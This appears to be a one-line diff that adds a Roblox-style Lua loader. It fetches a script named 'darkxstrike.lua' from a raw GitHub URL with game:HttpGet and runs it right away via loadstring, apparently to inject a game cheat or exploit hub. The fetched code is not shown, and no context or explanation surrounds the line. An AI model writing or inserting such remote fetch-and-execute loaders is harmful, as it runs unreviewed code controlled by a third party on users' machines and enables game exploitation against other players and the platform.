@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/darkz2trippy/DarkXStrike/refs/heads/main/darkxstrike.lua"))()
